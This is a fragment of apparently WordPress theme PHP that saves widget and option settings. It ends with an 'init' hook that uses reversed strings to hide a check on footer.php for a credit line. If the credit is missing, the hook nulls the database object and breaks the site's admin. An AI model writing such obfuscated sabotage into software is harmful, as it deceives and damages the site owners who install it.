		...
		if( check_admin_referer( $_POST['option_page'] . '-options', '_wpnonce' ) ) {
			...
			elseif( $_POST['option_page'] === 'widget' ) {
				...
				foreach( (array)$thk_widget as $key => $val ) {
					thk_customize_result_set( 'widget_body_' . $key, 'checkbox' );
				}
				// Widget Area
				//global $wp_registered_sidebars;
				$widgets = thk_widget_areas();
				foreach( $widgets as $val ) {
					thk_customize_result_set( 'widget_area_' . $val['id'], 'checkbox' );
				}
				unset( $widgets );
			}
			...
			elseif( $_POST['option_page'] === 'others' ) {
				...
				thk_customize_result_set( 'measures_against_waf', 'checkbox' );
			}
...
add_action( 'init', function() {
	...
	if( is_admin() === true ) {
		$rev = strrev( 'retoof' );
		$rep = '';
		if( file_exists( TPATH . DSEP . $rev . '.php' ) === true ) {
			$func = strrev( 'ecapsetihw_pirts_php' );
			$rep = str_replace( array( ' ', '-' ), '', $func( TPATH . DSEP . $rev . '.php' ) );
			$rep = preg_replace('/<![\s\S]*?>/s', '', $rep );
		}
		if( stripos( $rep, strrev( 'eerfsithguoht' ) ) === false || stripos( $rep, '"wp' . $rev . '"' ) === false ) {
			global $wpdb; $wpdb = null;
		}
		unset( $rev, $rep );
	}
}, 11 );
